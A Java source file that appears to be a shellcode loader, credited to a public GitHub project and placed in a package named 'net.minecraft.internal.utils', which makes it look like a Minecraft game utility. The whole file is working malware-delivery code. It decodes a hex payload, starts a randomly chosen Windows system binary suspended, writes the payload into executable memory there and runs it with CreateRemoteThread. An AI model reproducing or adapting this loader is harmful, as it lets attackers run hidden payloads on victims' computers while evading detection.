//Code from https://github.com/yzddmr6/Java-Shellcode-Loader
package net.minecraft.internal.utils;

import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinBase;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT.HANDLE;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;

import java.util.Random;

public class ShellcodeLoader {
    public static final String[] targetProcessArray = {"C:\\Windows\\SysWOW64\\ARP.exe", "C:\\Windows\\SysWOW64\\at.exe", "C:\\Windows\\SysWOW64\\auditpol.exe",
            "C:\\Windows\\SysWOW64\\bootcfg.exe", "C:\\Windows\\SysWOW64\\ByteCodeGenerator.exe",
            "C:\\Windows\\SysWOW64\\cacls.exe", "C:\\Windows\\SysWOW64\\chcp.com",
            "C:\\Windows\\SysWOW64\\CheckNetIsolation.exe", "C:\\Windows\\SysWOW64\\chkdsk.exe",
            "C:\\Windows\\SysWOW64\\choice.exe", "C:\\Windows\\SysWOW64\\cmdkey.exe", "C:\\Windows\\SysWOW64\\comp.exe",
            "C:\\Windows\\SysWOW64\\diskcomp.com", "C:\\Windows\\SysWOW64\\Dism.exe", "C:\\Windows\\SysWOW64\\esentutl.exe",
            "C:\\Windows\\SysWOW64\\expand.exe", "C:\\Windows\\SysWOW64\\fc.exe", "C:\\Windows\\SysWOW64\\find.exe",
            "C:\\Windows\\SysWOW64\\gpresult.exe"};
    static final Kernel32 kernel32 = Native.load(Kernel32.class, W32APIOptions.UNICODE_OPTIONS);
    static final IKernel32 iKernel32 = Native.load("kernel32", IKernel32.class);

    public static byte[] hexStrToByteArray(String str) {
        if (str == null) {
            return null;
        } else if (str.length() == 0) {
            return new byte[0];
        } else {
            byte[] byteArray = new byte[str.length() / 2];

            for (int i = 0; i < byteArray.length; ++i) {
                String subStr = str.substring(2 * i, 2 * i + 2);
                byteArray[i] = (byte) Integer.parseInt(subStr, 16);
            }

            return byteArray;
        }
    }

    public void loadShellCode(String shellcodeHex) {
        int j = targetProcessArray.length;
        byte b = 0;
        Random random = new Random();
        int k = b + random.nextInt(j);
        String targetProcess = targetProcessArray[k];
        this.loadShellCode(shellcodeHex, targetProcess);
    }

    public void loadShellCode(String shellcodeHex, String targetProcess) {
        byte[] shellcode = hexStrToByteArray(shellcodeHex);
        int shellcodeSize = shellcode.length;
        IntByReference intByReference = new IntByReference(0);
        Memory memory = new Memory(shellcodeSize);

        for (int j = 0; j < shellcodeSize; ++j) {
            memory.setByte(j, shellcode[j]);
        }

        WinBase.PROCESS_INFORMATION processInformation = new WinBase.PROCESS_INFORMATION();
        WinBase.STARTUPINFO startupInfo = new WinBase.STARTUPINFO();
        startupInfo.cb = new WinDef.DWORD(processInformation.size());
        if (kernel32.CreateProcess(targetProcess, null, null, null, false, new WinDef.DWORD(4L), null, null, startupInfo, processInformation)) {
            Pointer pointer = iKernel32.VirtualAllocEx(processInformation.hProcess, Pointer.createConstant(0), shellcodeSize, 4096, 64);
            iKernel32.WriteProcessMemory(processInformation.hProcess, pointer, memory, shellcodeSize, intByReference);
            HANDLE hANDLE = iKernel32.CreateRemoteThread(processInformation.hProcess, null, 0, pointer, 0, 0, null);
            kernel32.WaitForSingleObject(hANDLE, -1);
        }
    }

    interface IKernel32 extends StdCallLibrary {
        Pointer VirtualAllocEx(HANDLE var1, Pointer var2, int var3, int var4, int var5);

        HANDLE CreateRemoteThread(HANDLE var1, Object var2, int var3, Pointer var4, int var5, int var6, Object var7);

        void WriteProcessMemory(HANDLE param1HANDLE, Pointer param1Pointer1, Pointer param1Pointer2, int param1Int, IntByReference param1IntByReference);
    }
}

